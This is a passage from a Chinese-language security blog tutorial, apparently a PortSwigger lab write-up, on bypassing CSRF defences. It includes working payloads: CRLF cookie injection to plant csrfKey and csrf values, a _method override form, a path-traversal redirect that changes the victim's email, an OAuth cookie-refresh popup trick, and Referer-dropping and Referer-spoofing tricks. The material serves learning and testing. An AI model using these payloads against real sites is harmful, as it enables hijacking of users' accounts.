+</span></span><span class="line"><span class="ln">3</span><span class="cl">Content-Type: application/x-www-form-urlencoded
+</span></span><span class="line"><span class="ln">4</span><span class="cl">Content-Length: 68
+</span></span><span class="line"><span class="ln">5</span><span class="cl">Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv
+</span></span><span class="line"><span class="ln">6</span><span class="cl">
+</span></span><span class="line"><span class="ln">7</span><span class="cl">csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&amp;email=wiener@normal-user.com
+</span></span></code></pre></div><p>其中，Cookie中的<code>csrfKey</code>值就与<code>csrf</code>令牌关联，但不与Cookie本身关联。于是，可以将攻击者账户的<code>csrfKey</code>值与<code>csrf</code>值完整覆盖第1个用户的，从而实现<code>CSRF</code>攻击。</p>
+<p>例如，将第2个账户的两个值都覆盖第1个账户之后，需要在<code>CSRF PoC</code>中进行调整。将自动提交的<code>&lt;script&gt;</code>标签，稍作更改，添加<code>crsfKey</code>：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="ln">1</span><span class="cl"><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None&#34;</span> <span class="na">onerror</span><span class="o">=</span><span class="s">&#34;document.forms[0].submit()&#34;</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p>这里是因为<code>search</code>对应的搜索功能没有 CSRF 保护，所以可以使用它来将 cookie 注入受害者用户的浏览器。</p>
+<h3 id="cookie-中重复令牌">Cookie 中重复令牌<a hidden class="anchor" aria-hidden="true" href="#cookie-中重复令牌">#</a></h3>
+<p>有些应用程序不维护任何已发出的令牌的服务器端记录，而是在 cookie 和请求参数中复制每个令牌。当后续请求被验证时，应用程序只需验证请求参数中提交的令牌是否与 cookie 提交的值相符。这有时被称为针对CSRF的“双重提交”防御，因其易于实现且无需任何服务器端状态而被推荐：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">POST /email/change HTTP/1.1
+</span></span><span class="line"><span class="ln">2</span><span class="cl">Host: vulnerable-website.com
+</span></span><span class="line"><span class="ln">3</span><span class="cl">Content-Type: application/x-www-form-urlencoded
+</span></span><span class="line"><span class="ln">4</span><span class="cl">Content-Length: 68
+</span></span><span class="line"><span class="ln">5</span><span class="cl">Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa
+</span></span><span class="line"><span class="ln">6</span><span class="cl">
+</span></span><span class="line"><span class="ln">7</span><span class="cl">csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&amp;email=wiener@normal-user.com
+</span></span></code></pre></div><p>只要攻击者能够将设置被害者的Cookie，就可以通过让Cookie中的<code>csrf</code>值和外部的令牌相同而成功攻击。</p>
+<p>例如，将<code>csrf</code>值全部改为<code>fake</code>，于是，将生成的<code>PoC</code>中“自动提交”的<code>&lt;script&gt;</code>标签改为：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="ln">1</span><span class="cl"><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None&#34;</span> <span class="na">onerror</span><span class="o">=</span><span class="s">&#34;document.forms[0].submit();&#34;</span><span class="p">/&gt;</span>
+</span></span></code></pre></div><p>再更改邮箱地址后，放入攻击服务器中即可。</p>
+<h2 id="绕过samesite-cookie限制">绕过SameSite cookie限制<a hidden class="anchor" aria-hidden="true" href="#绕过samesite-cookie限制">#</a></h2>
+<p>SameSite是一种浏览器安全机制，用于控制浏览器在<strong>跨站请求</strong>（即请求的来源与目标站点不同）时是否发送该 Cookie。通过在 Cookie 中设置 SameSite 属性，服务器可以声明该 Cookie 是否应被附加到跨站请求中，从而增强 Web 应用的安全性。</p>
+<blockquote>
+<p>[!note]
+在 Cookie 的 SameSite 机制中，“同一站点”（Same-site）是根据 <strong>站点</strong>（site）来判定的，而不是根据源（origin）。判定规则：</p>
+<ul>
+<li>比较两个 URL 的 <strong>协议（scheme）</strong> 是否相同（例如 <code>https://</code> 和 <code>http://</code>）。</li>
+<li>比较两个 URL 的 <strong>有效顶级域名（如 <code>.com</code>、<code>.co.uk</code> 等） + 一级域名（eTLD+1）</strong> 是否相同。</li>
+<li>如果 <strong>协议相同</strong> 且 <strong>eTLD+1 相同</strong>，则视为<strong>同一站点</strong>；否则视为<strong>跨站</strong>（cross-site）。
+例如：</li>
+</ul>
+<table>
+	<thead>
+			<tr>
+					<th><strong>请求来源</strong></th>
+					<th><strong>请求去向</strong></th>
+					<th><strong>同站？</strong></th>
+					<th><strong>同源？</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><code>https://example.com</code></td>
+					<td><code>https://example.com</code></td>
+					<td>是</td>
+					<td>是</td>
+			</tr>
+			<tr>
+					<td><code>https://app.example.com</code></td>
+					<td><code>https://intranet.example.com</code></td>
+					<td>是</td>
+					<td>不，域名不匹配</td>
+			</tr>
+			<tr>
+					<td><code>https://example.com</code></td>
+					<td><code>https://example.com:8080</code></td>
+					<td>是</td>
+					<td>不，端口不匹配</td>
+			</tr>
+			<tr>
+					<td><code>https://example.com</code></td>
+					<td><code>https://example.co.uk</code></td>
+					<td>不，eTLD不匹配</td>
+					<td>不，域名不匹配</td>
+			</tr>
+			<tr>
+					<td><code>https://example.com</code></td>
+					<td><code>http://example.com</code></td>
+					<td>不，协议不匹配</td>
+					<td>不，协议不匹配</td>
+			</tr>
+	</tbody>
+</table>
+</blockquote>
+<p>SameSite有3个级别，分别如下：</p>
+<table>
+	<thead>
+			<tr>
+					<th>值</th>
+					<th>行为描述</th>
+					<th>适用场景示例</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><strong>Strict</strong></td>
+					<td><strong>最严格</strong>：Cookie 仅在<strong>同一站点</strong>（即请求的站点与 Cookie 的域名完全一致）的请求中发送。<strong>所有跨站请求均不发送</strong></td>
+					<td>银行交易、个人设置页等高度敏感的操作。用户必须先在当前站点内点击链接或提交表单才能保持登录</td>
+			</tr>
+			<tr>
+					<td><strong>Lax</strong></td>
+					<td><strong>中等</strong>：在跨站请求中，仅允许<strong>安全的顶级导航</strong>（如点击链接、GET 表单提交）发送 Cookie，这既允许从外部链接进入网站时保持登录，又能防止跨站 POST 攻击</td>
+					<td>大部分网站的会话 Cookie。用户从搜索引擎点击链接进入主页时仍可保持登录，但跨站的 POST 操作会被阻断</td>
+			</tr>
+			<tr>
+					<td><strong>None</strong></td>
+					<td><strong>无限制</strong>：所有跨站请求都会发送 Cookie（包括第三方嵌入的请求）。但设置 <code>SameSite=None</code> 时必须同时指定 <code>Secure</code> 属性，<code>SameSite=None; Secure</code>，即 Cookie 只能通过 HTTPS 发送，否则浏览器会拒绝</td>
+					<td>需要跨站携带 Cookie 的场景，如单点登录（SSO）、嵌入第三方服务的 widget 等</td>
+			</tr>
+	</tbody>
+</table>
+<h3 id="get方法绕过-lax">GET方法绕过 Lax<a hidden class="anchor" aria-hidden="true" href="#get方法绕过-lax">#</a></h3>
+<p>即使普通的 <code>GET</code> 请求不被Lax允许，一些框架也提供了覆盖请求行中指定的方法的方式。例如，Symfony 支持表单中的 <code>_method</code> 参数，该参数在路由时优先于普通方法：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&lt;form action=&#34;https://vulnerable-website.com/account/transfer-payment&#34; method=&#34;GET&#34;&gt;
+</span></span><span class="line"><span class="ln">2</span><span class="cl">    &lt;input type=&#34;hidden&#34; name=&#34;_method&#34; value=&#34;POST&#34;&gt;
+</span></span><span class="line"><span class="ln">3</span><span class="cl">    &lt;input type=&#34;hidden&#34; name=&#34;recipient&#34; value=&#34;hacker&#34;&gt;
+</span></span><span class="line"><span class="ln">4</span><span class="cl">    &lt;input type=&#34;hidden&#34; name=&#34;amount&#34; value=&#34;1000000&#34;&gt;
+</span></span><span class="line"><span class="ln">5</span><span class="cl">&lt;/form&gt;
+</span></span></code></pre></div><p>例如，在登录的 <code>POST /login</code> 页面，没有发现响应的 <code>Set-Cookie</code> 参数中对 <code>SameSite</code> 有专门设置，那大概率就是默认的Lax级别。在更改电子邮件地址页面，直接将 <code>POST</code> 方法强行改为 <code>GET</code> 方法是不行的。于是，有两种具体的实施思路。一个是，在网址后面紧跟 <code>_method</code>，即 <code>&amp;_method=POST</code> 。然后生成 <code>PoC</code> 即可。另一个是，就用 <code>GET</code> 方法不变，更改 <code>PoC</code> 。更改后的结果如上所示。</p>
+<h3 id="重定向绕过-strict">重定向绕过 Strict<a hidden class="anchor" aria-hidden="true" href="#重定向绕过-strict">#</a></h3>
+<p>例如，在 <code>login</code> 页面中已经发现，响应的 <code>Set-Cookie</code> 参数中设置了 <code>SameSite=Strict</code>。于是，考虑客户端的重定向绕过。发表评论成功之后，发现 <code>/post/comment/confirmation?postId=x</code> 网址被重定向到了之前的博客页面。仔细查看，发现是有一个js文件根据 <code>postId</code> 参数进行的重定向。于是，进行路径遍历，直到重定向到已登录的账户页面。发现路径遍历的结果是 <code>/post/comment/confirmation?postId=1/../../my-account</code> 。在漏洞服务器中尝试下面的payload，发现确实出现了已登录的账户页面：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&lt;script&gt;
+</span></span><span class="line"><span class="ln">2</span><span class="cl">    document.location = &#34;https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=../my-account&#34;;
+</span></span><span class="line"><span class="ln">3</span><span class="cl">&lt;/script&gt;
+</span></span></code></pre></div><p>这说明，浏览器在第二个请求中包含了已验证的会话 cookie。第1个请求是从漏洞服务器到 <code>/post/comment/confirmation?postId=1</code> ，属于跨站请求；第2个请求是到 <code>/my-account</code> ，属于同站请求。接着查看修改邮件地址的页面，把 <code>POST</code> 方法更改为 <code>GET</code> 方法居然能够成功。于是，直接构造payload进行攻击：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&lt;script&gt;
+</span></span><span class="line"><span class="ln">2</span><span class="cl">    document.location = &#34;https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1&#34;;
+</span></span><span class="line"><span class="ln">3</span><span class="cl">&lt;/script&gt;
+</span></span></code></pre></div><p>这里为了避免干扰 <code>postId</code> 参数解析，对 <code>&amp;</code> 进行了 URL 编码。</p>
+<h3 id="cookie-刷新绕过-lax">cookie 刷新绕过 Lax<a hidden class="anchor" aria-hidden="true" href="#cookie-刷新绕过-lax">#</a></h3>
+<p>如前所述，如果网站在设置 cookie 时未包含 <code>SameSite</code> 属性，Chrome 默认会自动应用 <code>Lax</code> 限制。然而，为了避免破坏单点登录 (SSO) 机制，它实际上不会对顶级 <code>POST</code> 请求在最初的 120 秒强制执行这些限制。因此，用户可能在两分钟的时间窗口内容易受到跨站攻击。但是，在2分钟内完成所有攻击有点仓促。于是，有两种思路。一个是，如果能在网站上找到一个小工具，强制受害者获取新的会话cookie，那就可以在进行主要攻击之前提前刷新他们的cookie。例如，完成基于OAuth的登录流程可能每次都会产生一个新的会话，因为OAuth服务不一定知道用户是否仍然登录到目标网站。让用户离开当前页面去 OAuth 登录，完成后再返回，但这样会打断攻击流程，且需要用户配合返回。另一个是，从新标签页触发Cookie刷新，这样浏览器就不会在发动最终攻击前离开页面。但是，这个弹窗默认会被浏览器屏蔽：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">window.open(&#39;https://vulnerable-website.com/login/sso&#39;);
+</span></span></code></pre></div><p>为了绕过这个问题，可以用事件处理程序<code>onclick</code>将语句包装如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">window.onclick = () =&gt; { window.open(&#39;https://vulnerable-website.com/login/sso&#39;); }
+</span></span></code></pre></div><p>例如，对于使用 OAuth 流程登录账号，发现更改电子邮件的页面没有 <code>csrf</code> 令牌，这就可能受到攻击。登录的2分钟内，用普通的 <code>PoC</code> 放在漏洞利用服务器中，发现确实能够更改邮件地址。这说明时间窗口的存在，攻击者需要刷新会话以重置窗口。然后，利用 <code>/social-login</code> 刷新会话。 <code>/social-login</code> 会自动启动OAuth流程，即使用户已登录，也会重新认证并设置新的会话Cookie。于是，采用下面的payload：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln"> 1</span><span class="cl">&lt;form method=&#34;POST&#34; action=&#34;https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email&#34;&gt;
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">    &lt;input type=&#34;hidden&#34; name=&#34;email&#34; value=&#34;pwned@portswigger.net&#34;&gt;
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">&lt;/form&gt;
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">&lt;p&gt;Click anywhere on the page&lt;/p&gt;
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">&lt;script&gt;
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    window.onclick = () =&gt; {
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">        window.open(&#39;https://YOUR-LAB-ID.web-security-academy.net/social-login&#39;);
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">        setTimeout(changeEmail, 5000);
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    }
+</span></span><span class="line"><span class="ln">10</span><span class="cl">
+</span></span><span class="line"><span class="ln">11</span><span class="cl">    function changeEmail() {
+</span></span><span class="line"><span class="ln">12</span><span class="cl">        document.forms[0].submit();
+</span></span><span class="line"><span class="ln">13</span><span class="cl">    }
+</span></span><span class="line"><span class="ln">14</span><span class="cl">&lt;/script&gt;
+</span></span></code></pre></div><p>查看漏洞利用效果时，点击任意一处即可触发。</p>
+<h2 id="绕过基于referer的csrf防御">绕过基于Referer的CSRF防御<a hidden class="anchor" aria-hidden="true" href="#绕过基于referer的csrf防御">#</a></h2>
+<p>除了使用 CSRF 令牌的防御之外，一些应用程序还会使用 HTTP <code>Referer</code> 头来尝试防御 CSRF 攻击，通常通过验证请求是否来自应用程序自己的域。这种方法通常效果较差，并且经常容易被绕过。</p>
+<h3 id="referer的验证依赖于头部的存在">Referer的验证依赖于头部的存在<a hidden class="anchor" aria-hidden="true" href="#referer的验证依赖于头部的存在">#</a></h3>
+<p>一些应用程序在请求中存在 <code>Referer</code> 头时会验证它，但如果省略该头则跳过验证。在这种情况下，攻击者可以以某种方式构造他们的 CSRF 利用，使受害用户的浏览器在生成的请求中丢弃 <code>Referer</code> 头。实现这一点的方法有很多，但最简单的方法是在托管 CSRF 攻击的 HTML 页面中使用 META 标签：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&lt;meta name=&#34;referrer&#34; content=&#34;never&#34;&gt;
+</span></span></code></pre></div><p>例如，在更改电子邮件地址的页面，发现改动 <code>Referer</code> 头，请求会被拒绝，但是删除又会被接受。所以，在生成的 <code>PoC</code> 中添加上面的META标签即可。</p>
+<h3 id="referer验证失效">Referer验证失效<a hidden class="anchor" aria-hidden="true" href="#referer验证失效">#</a></h3>
+<p>一些应用程序以一种简单粗暴的方式验证 <code>Referer</code> 头，这种方式可能被绕过。例如，如果应用程序验证 <code>Referer</code> 中的域名以预期值开头，攻击者就可以将其作为自己域名的子域名放置。同样，如果应用程序只是验证 <code>Referer</code> 是否包含其自身的域名，攻击者就可以在 URL 的其他位置放置所需的值：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">http://attacker-website.com/csrf-attack?vulnerable-website.com
+</span></span></code></pre></div><p>但是，许多浏览器现在默认会从 <code>Referer</code> 头中去掉查询字符串。可以通过确保包含漏洞利用的响应设置了 <code>Referrer-Policy: unsafe-url</code> 头来覆盖此行为。这将确保发送完整的 URL，包括查询字符串。</p>
+<p>例如，在更改邮件地址的页面，发现网站能够接受任何包含有预期域名的 <code>Referer</code> 头。比如：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">Referer: https://incorrect.net?YOUR-LAB-ID.web-security-academy.net
+</span></span></code></pre></div><p>这样能够被接受。于是，在生成的 <code>PoC</code> 中修改一处：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&lt;script&gt;
+</span></span><span class="line"><span class="ln">2</span><span class="cl">history.pushState(&#39;&#39;, &#39;&#39;, &#39;/?YOUR-LAB-ID.web-security-academy.net&#39;);
+</span></span><span class="line"><span class="ln">3</span><span class="cl">&lt;/script&gt;
+</span></span></code></pre></div><p>这里的 <code>history.pushState()</code> 是在不刷新页面的情况下改变浏览器地址栏的 URL。但是，因为许多浏览器现在默认会从Referer头中移除查询字符串以作为安全措施。所以，为了覆盖此行为并确保请求中包含完整URL，还需要在漏洞利用服务器的“头部”里添加 <code>Referrer-Policy: unsafe-url</code> 头。</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://all-on.github.io/posts/web/sql/union%E6%B3%A8%E5%85%A5/">
+    <span class="title">« </span>
+    <span>Union注入</span>
+  </a>
+  <a class="next" href="https://all-on.github.io/posts/web/api-%E6%B5%8B%E8%AF%95/">
+    <span class="title"> »</span>
+    <span>API 测试</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="https://all-on.github.io/">All-on&#39;s Blog</a></span> · 
+
+    
+    
+    <span>
+        Powered by
+        <a href="https://gohugo.io/?utm_source=papermod" rel="noopener" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" id="top-link" class="top-link hidden" aria-label="go to top" title="Go to Top (Alt + G)" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-up">
+        <polyline points="17 11 12 6 7 11"></polyline>
+        <polyline points="17 18 12 13 7 18"></polyline>
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var toplink = document.getElementById("top-link");
+    window.onscroll = function () {
+        const scrollThreshold = window.innerHeight;
+        if (document.body.scrollTop > scrollThreshold || document.documentElement.scrollTop > scrollThreshold) {
+            toplink.classList.remove("hidden");
+        } else {
+            toplink.classList.add("hidden");
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
